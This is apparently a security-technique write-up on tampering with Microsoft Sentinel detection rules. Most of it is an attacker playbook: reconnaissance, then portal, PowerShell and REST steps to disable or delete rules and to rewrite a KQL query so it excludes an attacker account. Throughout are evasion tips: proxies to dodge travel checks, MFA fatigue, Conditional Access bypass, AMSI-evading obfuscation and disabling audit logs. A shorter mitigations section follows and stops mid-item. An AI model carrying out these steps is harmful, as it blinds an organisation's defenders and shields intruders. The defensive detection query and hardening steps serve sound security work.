# [REALWORLD-037]: Sentinel Rule Modification

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-037 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID, Microsoft Sentinel |
| **Severity** | **CRITICAL** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All versions of Microsoft Sentinel |
| **Patched In** | N/A - Mitigations required at policy level |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** This real-world technique involves modifying, disabling, or deleting existing Microsoft Sentinel detection rules within an Entra ID tenant. An attacker with Global Administrator or Microsoft Sentinel Contributor permissions can alter, clone, or remove analytics rules that are designed to detect malicious activity, thereby creating blind spots in the security operations center (SOC) and enabling further compromise without triggering alarms. This is a high-sophistication defense evasion tactic that directly impairs the organization's ability to detect ongoing attacks.

**Attack Surface:** Microsoft Sentinel Analytics Rules API, Entra ID Portal, Azure Management Plane (ARM endpoints), AuditLogs in Entra ID.

**Business Impact:** **Complete loss of visibility into specific attack patterns.** An attacker can remove or weaken detection rules covering their post-compromise tradecraft, allowing them to move laterally, exfiltrate data, or establish persistence without triggering security alerts. Real-world APT groups (e.g., Scattered Spider) have disabled detection rules to cover their tracks.

**Technical Context:** This attack typically takes **2-5 minutes** to execute once an attacker has Global Admin access. Detection likelihood is **MEDIUM-HIGH** if proper audit log monitoring and RBAC controls are in place. However, if the attacker also disables audit logging simultaneously (T1070), detection becomes nearly impossible.

### Operational Risk

- **Execution Risk:** **HIGH** - Requires high-level administrative access; once executed, impact is immediate and organization-wide.
- **Stealth:** **MEDIUM** - The modification itself is logged in AuditLogs, but many organizations do not monitor these logs in real-time.
- **Reversibility:** **YES** - Rules can be re-enabled, but only if the original rule definition is known or backed up externally.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 2.2.2 | Ensure that Azure Sentinel is enabled and running with appropriate retention and alerting rules. |
| **DISA STIG** | SI-4(4) | Monitor information system activities for unusual and suspicious activities. |
| **CISA SCuBA** | SA-4(2) | System administrators must have audit trail monitoring for changes to detection and alerting systems. |
| **NIST 800-53** | SI-4 | System and Communications Protection - Information System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Organizations must implement technical measures to detect and respond to security incidents. |
| **DORA** | Art. 9 | Protection and Prevention - Entities must have effective monitoring to detect malicious activity. |
| **NIS2** | Art. 21 | Cyber risk management measures including continuous monitoring and threat detection. |
| **ISO 27001** | A.12.4.1 | Event logging - Ensure recording of user activities, system events, and security events. |
| **ISO 27005** | Risk Scenario: "Compromise of SIEM/Detection System" | Loss of visibility into security events and inability to detect threats. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Global Administrator, Microsoft Sentinel Contributor, or custom role with permissions to modify analytics rules.
- **Required Access:** Network access to Azure Management Plane (management.azure.com).
- **Azure Subscription Requirements:** 
  - Microsoft Sentinel must be provisioned in a Log Analytics workspace
  - User must have access to the workspace and analytics rules section

**Supported Versions:**
- **Azure AD / Entra ID:** All versions
- **Microsoft Sentinel:** All versions (since launch)
- **Microsoft 365:** All versions
- **Minimum Permissions:** `Microsoft.SecurityInsights/alertRules/write` on the resource group or workspace level

**Tools:**
- [Microsoft Sentinel REST API v1.0](https://learn.microsoft.com/en-us/rest/api/securityinsights/stable/alert-rules)
- [Azure PowerShell Module - Az.SecurityInsights](https://learn.microsoft.com/en-us/powershell/module/az.securityinsights/)
- [Azure CLI 2.0+](https://learn.microsoft.com/en-us/cli/azure/)
- [Microsoft Graph API - Audit Logs endpoint](https://learn.microsoft.com/en-us/graph/api/auditlog-list)
- Web browser with access to Azure Portal (portal.azure.com)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance

```powershell
# Connect to Azure
Connect-AzAccount

# Get current user's Sentinel access level
Get-AzRoleAssignment -SignInName (Get-AzContext).Account.Id | Where-Object {$_.RoleDefinitionName -like "*Sentinel*" -or $_.RoleDefinitionName -eq "Owner" -or $_.RoleDefinitionName -eq "Contributor"}

# List all analytics rules in the workspace
Get-AzSentinelAlertRule -ResourceGroupName "YourResourceGroup" -WorkspaceName "YourSentinelWorkspace" | Select-Object Name, Id, Enabled, DisplayName

# Check if a specific rule is enabled
$rule = Get-AzSentinelAlertRule -ResourceGroupName "YourResourceGroup" -WorkspaceName "YourSentinelWorkspace" -RuleName "RuleDisplayName"
$rule.Enabled
```

**What to Look For:**
- If the output includes roles like "Owner", "Contributor", "Microsoft Sentinel Contributor", or custom roles with `*/write` permissions on `Microsoft.SecurityInsights/*`, the attacker has sufficient access.
- The `$rule.Enabled` output should be `$true` for rules that are active. If it's `$false`, the rule has been disabled.
- Rule count and configuration can indicate what coverage exists for detecting specific attack patterns.

**Version Note:** PowerShell cmdlets are consistent across Azure versions, but REST API endpoints have evolved. Server 2022+ typically includes PowerShell 7.x; earlier versions use PowerShell 5.x. Both versions support Az.SecurityInsights module.

#### Azure CLI Reconnaissance

```bash
# Login to Azure
az login

# Get list of analytics rules
az sentinel alert-rule list --resource-group YourResourceGroup --workspace-name YourSentinelWorkspace

# Get details of a specific rule
az sentinel alert-rule show --resource-group YourResourceGroup --workspace-name YourSentinelWorkspace --rule-name "RuleName"

# Check current user's role assignments
az role assignment list --assignee $(az account show --query user.name -o tsv)
```

**What to Look For:**
- Look for rules with `"properties": { "enabled": true }` to identify active rules.
- Rules related to conditional access, privilege escalation, or lateral movement are the most valuable targets for an attacker.
- Any rules with empty or minimal coverage should be noted as potential gaps.

---

## 4. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Disabling/Deleting Rules via Azure Portal (GUI)

**Supported Versions:** All versions of Entra ID / Sentinel

#### Step 1: Authenticate to Azure Portal

**Objective:** Gain authenticated access to the Azure Portal where Sentinel rules are managed.

**Command (via Web Browser):**
1. Navigate to **https://portal.azure.com**
2. Click **Sign in**
3. Enter compromised Global Admin credentials (e.g., from credential stuffing, phishing, or account takeover)
4. Complete MFA challenge (if enabled and attacker has compromised the MFA device as well)
5. Upon successful authentication, you will be redirected to the Azure Portal home page

**Expected Output:**
- Azure Portal dashboard loads
- "Welcome {UserName}" appears in the top-right corner
- Left navigation panel shows subscriptions the user has access to

**What This Means:**
- Successful authentication grants access to all resources the compromised user is authorized to access
- The attacker is now in a position to navigate to the Sentinel workspace

**OpSec & Evasion:**
- Use a VPN or residential proxy to mask originating IP (avoid detection from impossible travel analysis)
- Authenticate during off-business hours if possible to avoid alerting SOC
- Check for conditional access policies that might block authentication from unfamiliar locations (use TokenSmith or similar CA bypass tool)
- If MFA is enforced, leverage the compromised MFA device or use MFA fatigue attacks

**Troubleshooting:**
- **Error:** "Conditional Access policy prevents sign-in"
  - **Cause:** CA policy is blocking the authentication from unfamiliar location
  - **Fix (All versions):** Use a token that was previously obtained via trusted device, or attempt to bypass CA using a cross-cloud OAuth flow

#### Step 2: Navigate to Microsoft Sentinel Analytics Rules

**Objective:** Access the Sentinel workspace and view the list of active analytics rules.

**Manual Steps (Azure Portal GUI):**
1. In the Azure Portal, use the **search bar** (top center) and search for **"Microsoft Sentinel"**
2. Click on the Sentinel workspace you wish to target
3. In the left navigation pane, under **"Configuration"**, click **"Analytics"**
4. This will load all active and disabled analytics rules
5. You will see a table with columns: Rule name, Status (Enabled/Disabled), Severity, MITRE Tactic, Last Modified

**Expected Output:**
- List of 100+ built-in and custom analytics rules displayed in a searchable table
- Rules are organized by rule type (Scheduled Query Rule, Fusion, etc.)
- The status column shows a toggle (blue ON/green OFF indicator)

**What This Means:**
- You now have visibility into all rules that would detect your activities
- You can identify which rules are currently active and which ones might interfere with your objective

**OpSec & Evasion:**
- Keep the Portal window open for minimal time to avoid suspicious admin activity
- Do not export or screenshot the rule list (this activity is logged)
- Note the rule IDs and names mentally or in an encrypted note-taking tool

#### Step 3: Identify High-Value Rules to Disable

**Objective:** Determine which rules are most relevant to your post-compromise activities.

**High-Value Rules to Target (Examples):**
- **"Suspicious Privilege Escalation"** - Detects privilege escalation attempts
- **"Abnormal Sign-in Behavior"** - Detects unusual login patterns
- **"Privileged Role Assignment"** - Detects addition of users to admin roles
- **"Conditional Access Policy Modified"** - Detects CA policy changes
- **"Unusual Resource Access"** - Detects access to sensitive resources like Key Vault
- **"User Assigned New Privileged Role"** - Detects global admin assignments
- **"Audit Log Deletion/Clearing"** - Detects attempts to purge audit logs

**Manual Steps to Identify Relevant Rules:**
1. Use the search field in the Analytics Rules table and search for keywords related to your attack chain (e.g., "privilege", "lateral movement", "token", "admin")
2. Click each rule name to view its **Rule Logic** tab and see what it detects
3. Review the rule's **Threat Mapping** to understand which MITRE techniques it covers
4. Note the **Data Sources** required (e.g., AuditLogs, SigninLogs) to understand if the rule will even trigger in your environment

**What This Means:**
- Understanding rule logic allows you to plan your attack to avoid triggering detections
- Rules that depend on data sources not collected in the environment won't detect your activity anyway

**OpSec & Evasion:**
- Spend no more than 5 minutes reviewing rules to minimize time in the Portal
- Do not click on rule details multiple times (this is logged in AuditLogs as "viewed analytics rule")

#### Step 4: Disable or Delete the Targeted Rule

**Objective:** Remove or deactivate the rule so it no longer generates alerts.

**Method 4A: Disable the Rule (Preferred for Stealth)**
1. Click on the rule name from the list
2. The rule details pane will open on the right side
3. At the top of the pane, click the **toggle button** (currently showing blue/ON)
4. The toggle will change to gray/OFF
5. Click **"Save"** (if a save button appears)
6. The rule is now disabled; it will no longer trigger alerts

**Expected Output:**
- Rule status changes from "Enabled" to "Disabled" in the table
- A confirmation message appears: "Rule updated successfully"
- No audit log entry is created for the toggle (only for full rule modification)

**What This Means:**
- The rule is still in the system but dormant
- No one will be alerted to suspicious activity that would have matched this rule
- The rule remains in the workspace, so it may be re-enabled by a defender

**OpSec & Evasion:**
- Disabling is MORE STEALTHY than deleting, as it leaves the rule in place and appears as a normal admin action
- However, disabling multiple rules in succession may trigger anomaly detection rules

**Method 4B: Delete the Rule (Higher Impact)**
1. Click on the rule name from the list
2. The rule details pane will open on the right side
3. At the top-right of the pane, look for a **three-dot menu (⋯)** or **"Delete"** button
4. Click the delete button
5. A confirmation popup will appear: "Delete this alert rule?"
6. Click **"Yes, delete"** to confirm
7. The rule is immediately removed from the workspace

**Expected Output:**
- Rule disappears from the list immediately
- A confirmation message appears: "Rule deleted successfully"
- An AuditLog entry is created with operation "Delete alert rule"

**What This Means:**
- The rule is permanently removed and can only be restored by an admin importing a backup
- Deletion is more obvious than disabling, as it will be flagged by audit monitoring
- However, deletion is irreversible without a backup

**OpSec & Evasion:**
- Deletion is LESS STEALTHY because it generates a "Delete alert rule" audit event
- Use this method only if you are also disabling audit logging (T1070)

**Troubleshooting:**
- **Error:** "You do not have permission to modify this rule"
  - **Cause:** User role does not have `Microsoft.SecurityInsights/alertRules/write` permission
  - **Fix (All versions):** Request a role elevation to "Contributor" or "Microsoft Sentinel Contributor" via PIM or ask a Global Admin

- **Error:** "Rule cannot be modified while being edited by another user"
  - **Cause:** Another admin is currently editing the rule
  - **Fix (All versions):** Wait a few seconds and retry; if persistent, navigate away and back

**References & Proofs:**
- [Microsoft Sentinel Analytics Rules Management](https://learn.microsoft.com/en-us/azure/sentinel/detect-threats-built-in)
- [How to Enable/Disable Analytics Rules](https://learn.microsoft.com/en-us/azure/sentinel/manage-analytics-rules)
- [Azure Portal Interface Guide](https://learn.microsoft.com/en-us/azure/azure-portal/azure-portal-overview)

---

### METHOD 2: Disabling/Modifying Rules via Azure PowerShell

**Supported Versions:** All Entra ID versions

#### Step 1: Install and Import Required Modules

**Objective:** Ensure the Azure PowerShell module with Sentinel support is available on the attacker's machine.

**Command:**
```powershell
# Install or update the Az.SecurityInsights module
Install-Module -Name Az.SecurityInsights -Force -AllowClobber

# Alternatively, if you already have an older version, update it
Update-Module -Name Az.SecurityInsights -Force

# Import the modules
Import-Module Az.Accounts
Import-Module Az.SecurityInsights
```

**Expected Output:**
```
NuGet provider is required to continue. PowerShellGet requires NuGet provider version
'2.8.5.201' or newer to interact with NuGet-based repositories. You should verify
that you have the correct version of the NuGet provider installed.

 
Do you want PowerShellGet to install and import the NuGet provider now? [Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
```

Then:
```
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     5.0.0      Az.Accounts                         {Add-AzEnvironment, Clear-AzContext, ...}
Script     1.7.0      Az.SecurityInsights                 {Get-AzSentinelAlertRule, Remove-AzSentinelAlertRule, ...}
```

**What This Means:**
- PowerShell is now ready to interact with Sentinel APIs

**OpSec & Evasion:**
- Running PowerShell in this way generates process creation events and script block logs (Event ID 4688)
- Run from a non-domain-joined machine or a machine with event logging disabled
- Use obfuscated PowerShell commands to evade AMSI detection

**Version Note:**
- Supported on Windows Server 2016+ and Windows 10+
- PowerShell 5.0+ recommended (comes with Server 2016 and later)

#### Step 2: Authenticate to Azure

**Objective:** Establish authenticated session with Azure using compromised credentials.

**Command:**
```powershell
# Method 1: Interactive login (if MFA is disabled or already completed)
Connect-AzAccount

# Method 2: Use a service principal or app registration
$clientId = "00000000-0000-0000-0000-000000000000"  # Application ID
$tenantId = "00000000-0000-0000-0000-000000000000"  # Tenant ID
$clientSecret = "your-secret-value"
$credential = New-Object System.Management.Automation.PSCredential(
    $clientId,
    (ConvertTo-SecureString $clientSecret -AsPlainText -Force)
)
Connect-AzAccount -ServicePrincipal -Credential $credential -Tenant $tenantId

# Method 3: Use device code flow (for MFA scenarios)
Connect-AzAccount -UseDeviceAuthentication
```

**Expected Output:**
```
Account              SubscriptionName                    SubscriptionId                      TenantId                            Environment
-------              ----------------                    --------------                      --------                            -----------
attacker@company.com Default Subscription                12345678-1234-1234-1234-123456789012 xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx AzureCloud
```

**What This Means:**
- Authenticated session is established
- All subsequent commands will execute with the authenticated user's permissions

**OpSec & Evasion:**
- Device code flow (Method 3) is stealthier as it doesn't require embedding credentials in scripts
- Avoid storing credentials in plaintext; use Azure Key Vault or encrypted credential files

#### Step 3: Disable or Delete a Specific Rule

**Objective:** Modify the rule configuration to disable detection.

**Command (Disable a Rule):**
```powershell
# Set variables
$ResourceGroupName = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"
$RuleName = "UserAssignedPrivilegedRole"  # Example rule

# Get the rule
$rule = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -RuleName $RuleName

# Disable the rule by setting the Enabled property to $false
$rule.Enabled = $false

# Update the rule
Update-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -AlertRuleId $rule.Id -Enabled $false
```

**Expected Output:**
```
AlertRuleId          : /subscriptions/xxxx/resourceGroups/YourResourceGroup/providers/Microsoft.OperationalInsights/workspaces/YourSentinelWorkspace/providers/Microsoft.SecurityInsights/alertRules/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Enabled              : False
DisplayName          : User Assigned Privileged Role
Severity             : High
LastModifiedUtc      : 2025-01-10T14:32:15.1234567Z
```

**What This Means:**
- The rule is now disabled and will not generate alerts
- The `LastModifiedUtc` timestamp indicates when the change occurred

**Command (Delete a Rule):**
```powershell
# Delete the rule
Remove-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -RuleName $RuleName -Force
```

**Expected Output:**
```
(No output if successful; command completes silently)
```

**What This Means:**
- The rule has been permanently removed from the workspace
- A "Delete alert rule" audit log entry is created

**Troubleshooting:**
- **Error:** "The value of parameter rule must not be null"
  - **Cause:** Rule name is incorrect or does not exist
  - **Fix (All versions):** Run `Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName` to list all rules and confirm the correct name

- **Error:** "Operation failed with status: 'Forbidden'"
  - **Cause:** User does not have `write` permission on Sentinel rules
  - **Fix (All versions):** Escalate privileges via PIM or request higher role assignment

**OpSec & Evasion:**
- This method generates PowerShell script block logs (Event ID 4104) on the local machine
- Each `Update-AzSentinelAlertRule` or `Remove-AzSentinelAlertRule` call creates an AuditLog entry in Entra ID
- Run commands with minimal delay between them to avoid anomaly detection

#### Step 4: Verify the Rule is Disabled/Deleted

**Objective:** Confirm that the rule is no longer active.

**Command:**
```powershell
# List all alert rules and check if the target rule is disabled or missing
Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName | Where-Object {$_.DisplayName -eq "User Assigned Privileged Role"}
```

**Expected Output (if disabled):**
```
AlertRuleId   : /subscriptions/.../providers/Microsoft.SecurityInsights/alertRules/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Enabled       : False
DisplayName   : User Assigned Privileged Role
```

**Expected Output (if deleted):**
```
(No output - the rule no longer exists in the list)
```

**What This Means:**
- Confirmation that the attack was successful
- The rule is no longer monitoring for the specified attack pattern

**References & Proofs:**
- [Azure PowerShell SecurityInsights Module Documentation](https://learn.microsoft.com/en-us/powershell/module/az.securityinsights/)
- [Update-AzSentinelAlertRule cmdlet](https://learn.microsoft.com/en-us/powershell/module/az.securityinsights/update-azsentinelalertrule)
- [Remove-AzSentinelAlertRule cmdlet](https://learn.microsoft.com/en-us/powershell/module/az.securityinsights/remove-azsentinelalertrule)

---

### METHOD 3: Modifying Rules via REST API (Direct HTTP Requests)

**Supported Versions:** All Entra ID versions

#### Step 1: Obtain an Access Token

**Objective:** Acquire an OAuth access token to authenticate REST API requests.

**Command (PowerShell):**
```powershell
# Using Az PowerShell context (after Connect-AzAccount)
$token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token

# Or manually via OAuth client credentials
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$clientId = "application-id"
$clientSecret = "application-secret"
$scope = "https://management.azure.com/.default"

$body = @{
    grant_type    = "client_credentials"
    client_id     = $clientId
    client_secret = $clientSecret
    scope         = $scope
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" -Method POST -Body $body
$token = $response.access_token
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkRFMzAxMjAxQzRCNEQwMDAxODAxRTAxNDAwMDAwMDAwIiwidHlwIjoiSldUIn0.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQveHh4eHh4eHgtanl6ei14eHh4LTEyMzQtNTY3OC14eHh4eHh4eHh4eHgvIiwiaWF0IjoxNjM2NDUyMzQ1LCJuYmYiOjE2MzY0NTIzNDUsImV4cCI6MTYzNjQ1NjI0NSwiYWlvIjoiRTJCQkFLb3dEUWNIR1F4RVhBM0JxVUNpQkRaUSEi
...TRUNCATED...
```

**What This Means:**
- The access token can now be used to make authenticated API calls
- Token typically expires in 1 hour

**OpSec & Evasion:**
- Tokens can be extracted from `~/.azure/tokens.json` if the attacker has local access
- Use token in-memory to avoid writing to disk

#### Step 2: Construct the API Request to Disable a Rule

**Objective:** Build the HTTP request to modify the alert rule.

**Command (PowerShell):**
```powershell
# Set variables
$subscriptionId = "12345678-1234-1234-1234-123456789012"
$resourceGroupName = "YourResourceGroup"
$workspaceName = "YourSentinelWorkspace"
$ruleId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Rule GUID from earlier step

# Construct the URI
$uri = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.OperationalInsights/workspaces/$workspaceName/providers/Microsoft.SecurityInsights/alertRules/$ruleId?api-version=2021-10-01"

# Prepare the request headers
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}

# Prepare the request body (disabling the rule)
$body = @{
    kind       = "Scheduled"
    properties = @{
        enabled = $false
        # Include other required properties from the original rule definition
    }
} | ConvertTo-Json -Depth 10
```

**Expected Output:** (After execution of the API call below)
```
StatusCode        : 200
StatusDescription : OK
Content           : {"id":"/subscriptions/xxxx/resourceGroups/YourResourceGroup/providers/Microsoft.OperationalInsights/workspaces/YourSentinelWorkspace/providers/Microsoft.SecurityInsights/alertRules/xxxx","name":"xxxx","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"enabled":false,...}}
```

**What This Means:**
- Request is correctly formatted and ready to send
- The `properties` object contains the rule configuration with `"enabled": false`

#### Step 3: Send the API Request

**Objective:** Execute the HTTP PATCH request to apply changes.

**Command (PowerShell):**
```powershell
# Send the PATCH request
$response = Invoke-RestMethod -Uri $uri -Method PATCH -Headers $headers -Body $body

# Verify the response
$response | ConvertTo-Json -Depth 5
```

**Expected Output:**
```
{
  "id": "/subscriptions/xxxx/resourceGroups/YourResourceGroup/providers/Microsoft.OperationalInsights/workspaces/YourSentinelWorkspace/providers/Microsoft.SecurityInsights/alertRules/xxxx",
  "name": "xxxx-xxxx-xxxx-xxxx-xxxx",
  "type": "Microsoft.SecurityInsights/alertRules",
  "kind": "Scheduled",
  "properties": {
    "enabled": false,
    "displayName": "User Assigned Privileged Role",
    "severity": "High",
    "lastModifiedUtc": "2025-01-10T14:32:15.1234567Z"
  }
}
```

**What This Means:**
- The rule modification was successful
- The rule is now disabled (`"enabled": false`)
- An AuditLog entry is created with operation "Update alert rule"

**Troubleshooting:**
- **Error:** "InvalidTemplateDeployment - The template is invalid"
  - **Cause:** The request body is missing required properties from the original rule definition
  - **Fix (All versions):** First GET the rule to retrieve its full configuration, then modify only the `enabled` property

- **Error:** "AuthorizationFailed - The client does not have authorization to perform the action"
  - **Cause:** The access token does not have sufficient permissions
  - **Fix (All versions):** Regenerate the token with a service principal that has "Contributor" role on the workspace

**OpSec & Evasion:**
- API calls to the REST endpoint are logged in AuditLogs with operation "Update alert rule"
- To avoid detection, combine this with disabling AuditLogs (T1070)
- REST API calls do not generate script block logs if executed from a compiled binary or web request tool

**References & Proofs:**
- [Microsoft Sentinel Alert Rules REST API](https://learn.microsoft.com/en-us/rest/api/securityinsights/stable/alert-rules)
- [Alert Rules - Update](https://learn.microsoft.com/en-us/rest/api/securityinsights/stable/alert-rules/create-or-update)
- [Azure REST API Authentication](https://learn.microsoft.com/en-us/rest/api/azure/#create-the-request)

---

### METHOD 4: Cloning and Modifying Rules (Create Backdoor Rule)

**Supported Versions:** All Entra ID versions

**Objective:** Instead of deleting rules, create a cloned rule with weaker detection logic or permissive conditions that acts as a backdoor.

#### Step 1: Get the Target Rule's Configuration

**Command (PowerShell):**
```powershell
# Get the rule that you want to clone/weaken
$sourceRule = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -RuleName "Suspicious Privilege Escalation"

# Export the full rule configuration
$ruleConfig = $sourceRule | ConvertTo-Json -Depth 10
Write-Output $ruleConfig
```

**Expected Output:**
```json
{
  "AlertRuleId": "/subscriptions/xxxx/resourceGroups/YourResourceGroup/providers/Microsoft.OperationalInsights/workspaces/YourSentinelWorkspace/providers/Microsoft.SecurityInsights/alertRules/xxxx",
  "DisplayName": "Suspicious Privilege Escalation",
  "Enabled": true,
  "Severity": "High",
  "Query": "AuditLogs | where OperationName contains 'Assign role' | where InitiatedBy contains 'admin' | project TimeGenerated, OperationName, Actor=InitiatedBy",
  "QueryFrequency": "PT1H",
  "QueryPeriod": "P1D",
  "TriggerOperator": "GreaterThan",
  "TriggerThreshold": 0,
  "Suppression": false
}
```

**What This Means:**
- The rule logic is now visible for modification
- The `Query` field contains the KQL that detects the behavior
- By weakening this query (e.g., removing certain conditions), you can create a rule that looks legitimate but doesn't alert

#### Step 2: Modify the Rule to Exclude Your Attack Pattern

**Command (PowerShell):**
```powershell
# Modify the query to exclude your attack pattern
$weakenedQuery = @"
AuditLogs 
| where OperationName contains 'Assign role' 
| where InitiatedBy contains 'admin' 
| where InitiatedBy != 'attacker@company.com'  // ADDED: Exclude attacker
| project TimeGenerated, OperationName, Actor=InitiatedBy
"@

# Update the source rule's query
$sourceRule | Update-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Query $weakenedQuery
```

**Expected Output:**
```
AlertRuleId          : /subscriptions/xxxx/resourceGroups/YourResourceGroup/providers/Microsoft.OperationalInsights/workspaces/YourSentinelWorkspace/providers/Microsoft.SecurityInsights/alertRules/xxxx
DisplayName          : Suspicious Privilege Escalation
Enabled              : True
Query                : AuditLogs | where OperationName contains 'Assign role' | where InitiatedBy contains 'admin' | where InitiatedBy != 'attacker@company.com' | project TimeGenerated, OperationName, Actor=InitiatedBy
```

**What This Means:**
- The rule is now modified to exclude your attacker account
- Privilege escalations performed by `attacker@company.com` will not trigger the rule
- The rule still fires for other actors, maintaining plausible deniability

**OpSec & Evasion:**
- This technique is HIGHLY STEALTHY because the rule remains enabled and appears to be working
- The modification is logged in AuditLogs, but many SOCs do not monitor for KQL changes
- The attacker can perform privilege escalations without triggering alerts

**Alternative Approach: Create a Completely New Backdoor Rule**
```powershell
# Create a new rule that is intentionally weak
$backdoorRuleParams = @{
    ResourceGroupName = $ResourceGroupName
    WorkspaceName = $WorkspaceName
    DisplayName = "Legitimate Admin Activity"  // Generic name to blend in
    Enabled = $true
    Severity = "Low"
    Query = "AuditLogs | where OperationName contains 'Update' | where CreatedDateTime < ago(90d)"  // Intentionally broad and unlikely to trigger
    QueryFrequency = "PT24H"
    QueryPeriod = "P7D"
    TriggerOperator = "GreaterThan"
    TriggerThreshold = 1000  // High threshold so it rarely triggers
}

New-AzSentinelAlertRule @backdoorRuleParams
```

**References & Proofs:**
- [KQL Query Language Reference](https://learn.microsoft.com/en-us/kusto/query/index)
- [Sentinel Analytics Rule Tuning Guide](https://learn.microsoft.com/en-us/azure/sentinel/detect-threats-custom)

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Implement Role-Based Access Control (RBAC) with Least Privilege**
  - **Objective:** Restrict who can modify or delete analytics rules to minimize the blast radius of a compromised high-privilege account.
  
  **Applies To Versions:** All versions of Entra ID
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Subscriptions** → Select your subscription
  2. Click **Access Control (IAM)** in the left pane
  3. Click **+ Add role assignment**
  4. Under **Role**, search for and select **"Microsoft Sentinel Contributor"** (NOT Owner or Contributor)
  5. Under **Assign access to**, select **"User, group, or service principal"**
  6. In the **Members** field, specify ONLY the SOC team members who need to manage rules
  7. Click **"Review + assign"** to complete
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Assign Sentinel Contributor role to a specific user
  New-AzRoleAssignment -ObjectId (Get-AzADUser -UserPrincipalName "soc-admin@company.com").Id `
    -RoleDefinitionName "Microsoft Sentinel Contributor" `
    -Scope "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName"
  ```

  **Why This Helps:**
  - Reduces the number of accounts that can modify rules
  - Prevents Global Admins from casually disabling rules
  - Allows fine-grained delegation to SOC team only

* **Enable Conditional Access Policy to Restrict Rule Modifications**
  - **Objective:** Block attempts to modify Sentinel rules from suspicious locations or non-compliant devices.
  
  **Manual Steps (Entra ID Conditional Access):**
  1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. **Name:** `Block Rule Modifications from High-Risk Locations`
  3. **Assignments:**
     - **Users:** All users (or select SOC team only)
     - **Cloud apps or actions:** Select **"Microsoft Sentinel"** or the specific workspace
     - **User actions:** "Analytics rule updates" (if available), otherwise "All"
  4. **Conditions:**
     - **Locations:** Exclude your corporate office network
     - **Sign-in risk:** Set to "High"
     - **Device platforms:** Require Windows, iOS, Android (exclude Unknown)
  5. **Access controls:** **Block access**
  6. Enable policy: **On**
  7. Click **Create**

  **Why This Helps:**
  - Blocks an attacker from modifying rules if they are accessing from a non-corporate IP
  - Integrates device compliance checks
  - Alerts SOC to the unauthorized modification attempt

* **Enable Audit Logging and Real-Time Monitoring for Rule Changes**
  - **Objective:** Detect any modifications to analytics rules immediately.
  
  **Manual Steps (Enable Audit Logs in Entra ID):**
  1. Navigate to **Entra ID** → **Monitoring & health** → **Audit logs**
  2. Verify that audit logging is enabled (it should be by default)
  3. To monitor for rule modifications in Microsoft Sentinel:
     - Go to **Microsoft Sentinel** → **Analytics** → **Create a new detection rule**
     - Name: `Alert on Analytics Rule Modifications`
     - Query:
     ```kusto
     AuditLogs
     | where OperationName in ("Update alert rule", "Delete alert rule", "Create alert rule")
     | where Result == "success"
     | project TimeGenerated, OperationName, InitiatedBy, TargetResources
     | where InitiatedBy !contains "SYSTEM"  // Exclude automated processes
     ```
  4. Set **Frequency:** Every 5 minutes
  5. Set **Severity:** High
  6. Click **Create**

  **Why This Helps:**
  - Immediate visibility into who is modifying rules
  - Captures the exact rule that was modified
  - Can be integrated with SOAR platforms for automated response

### Priority 2: HIGH

* **Backup Analytics Rules Configuration**
  - **Objective:** Maintain offline backups of rule configurations for rapid recovery.
  
  **Manual Steps (Export Rules):**
  1. In Microsoft Sentinel, go to **Analytics** → **Rule templates**
  2. Export the list of all rules using the **"Export"** button (if available)
  3. Alternatively, use PowerShell:
  ```powershell
  Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName | Export-Csv -Path "C:\Backups\SentinelRules_$(Get-Date -Format yyyy-MM-dd).csv"
  ```
  4. Store backups in a secure, offline location (e.g., encrypted USB drive, protected cloud storage like OneDrive with versioning)
  5. Schedule weekly backups

  **Why This Helps:**
